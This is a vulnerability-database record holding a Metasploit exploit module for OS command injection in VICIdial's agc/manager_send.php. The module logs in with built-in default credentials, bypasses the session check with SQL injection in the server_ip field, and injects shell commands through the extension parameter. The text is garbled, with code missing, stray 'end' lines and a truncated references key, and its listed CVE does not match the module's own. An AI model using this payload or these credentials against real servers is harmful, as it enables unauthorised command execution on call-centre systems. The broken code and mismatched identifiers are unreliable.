{
    "text": "vul_url : ， vul_name : VICIdial Manager Send OS Command Injection Exploit ， vul_date : 2014.05.18 ， vul_credit_name : Adam ， vul_risk : High ， vul_local : No ， vul_remote : Yes ， vul_cve : CVE-2013-7382 ， vul_cwe : CWE-255 ， vul_poc : ， # This module requires Metasploit: http/metasploit.com/download ， # Current source: ， require 'msf/core' ， class Metasploit3 < Msf:Exploit:Remote ， Rank = ExcellentRanking ， include Msf:Exploit:Remote:HttpClient ， super(update_info(info, ， 'Name' => 'VICIdial Manager Send OS Command Injection', ， 'Description' => %q{ ， The file agc/manager_send.php in the VICIdial web application uses ， unsanitized user input as part of a command that is executed using the PHP ， passthru() function. A valid username, password and session are needed to access ， the injection point. Fortunately, VICIdial has two built-in accounts with default ， passwords and the manager_send.php file has a SQL injection vulnerability that can ， be used to bypass the session check as long as at least one session has been ， created at some point in time. In case there isn't any valid session, the user can ， provide astGUIcient credentials in order to create one. The results of the injected ， command are returned as part of the response from the web server. Affected versions ， include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The ， default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit. ， }, ， 'Author' => ， [ ， 'Adam Caudill <adam@adamcaudill.com>', # Vulnerability discovery ， 'AverageSecurityGuy <stephen@averagesecurityguy.info>', # Metasploit Module ， 'sinn3r', # Metasploit module ， 'juan vazquez' # Metasploit module ， ], ， 'License' => MSF_LICENSE, ， ' ， [ ， [ 'CVE', '2013-4467' ], ， [ 'CVE', '2013-4468' ], ， [ 'OSVDB', '98903' ], ， [ 'OSVDB', '98902' ], ， [ 'BID', '63340' ], ， [ 'BID', '63288' ], ， [ 'URL', ' ], ， [ 'URL', ' ] ， ], ， 'DisclosureDate' => 'Oct 23 2013', ， 'Privileged' => true, ， 'Platform' => ['unix'], ， 'Payload' => ， { ， 'DisableNops' => true, ， 'Space' => 8000, # Apache's limit for GET, it should be enough one to fit any payload ， 'Compat' => ， { ， 'PayloadType' => 'cmd', ， # Based on vicibox availability of binaries ， 'RequiredCmd' => 'generic perl python awk bash telnet nc openssl', ， } ， }, ， 'Targets' => ， [ ， [ 'CMD', ， { ， 'Arch' => ARCH_CMD, ， 'Platform' => 'unix' ， } ， ] ， ], ， 'DefaultTarget' => 0 ， register_options( ， [ ， OptString.new('USERNAME', [true, 'VICIdial Username', 'VDCL']), ， OptString.new('PASSWORD', [true, 'VICIdial Password', 'donotedit']), ， OptString.new('USER_ASTGUI', [false, 'astGUIcient User Login', '6666']), ， OptString.new('PASS_ASTGUI', [false, 'astGUIcient User Password', '1234']), ， OptString.new('PHONE_USER_ASTGUI', [false, 'astGUIcient Phone Login', '6666']), ， OptString.new('PHONE_PASSWORD_ASTGUI', [false, 'astGUIcient Phone Password', '1234']) ， ], self.class) ， end ， # Login through astGUIclient and create a web_client_sessions if there isn't ， # something available ， def login ， begin ， res = send_request_cgi({ ， 'uri' => '/agc/astguiclient.php', ， 'method' => 'POST', ， 'vars_post' => { ， \"user\" => datastore[\"USER_ASTGUI\"], ， \"pass\" => datastore[\"PASS_ASTGUI\"], ， \"phone_login\" => datastore[\"PHONE_USER_ASTGUI\"], ， \"phone_pass\" => datastore[\"PHONE_PASSWORD_ASTGUI\"] ， } ， }) ， rescue :Rex:ConnectionError ， vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\") ， end ， end ， def astguiclient_creds? ， end ， end ， end ， end ， end ， begin ， res = send_request_cgi({ ， 'uri' => '/agc/manager_send.php', ， 'method' => 'GET', ， 'vars_get' => { ， \"enable_sipsak_messages\" => \"1\", ， \"allow_sipsak_messages\" => \"1\", ， \"protocol\" => \"sip\", ， \"ACTION\" => \"OriginateVDRelogin\", ， \"session_name\" => rand_text_alpha(12), # Random session name ， \"server_ip\" => \"' OR '1' = '1\", # SQL Injection to validate the session ， \"extension\" => \";#{cmd};\", ， \"user\" => datastore['USERNAME'], ， \"pass\" => datastore['PASSWORD'] ， } ， }, timeout) ， rescue :Rex:ConnectionError ， vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\") ， end ， end ， def check ， res = request('ls -a .') ， vprint_error(\"#{peer} - Invalid Username or Password.\")"
}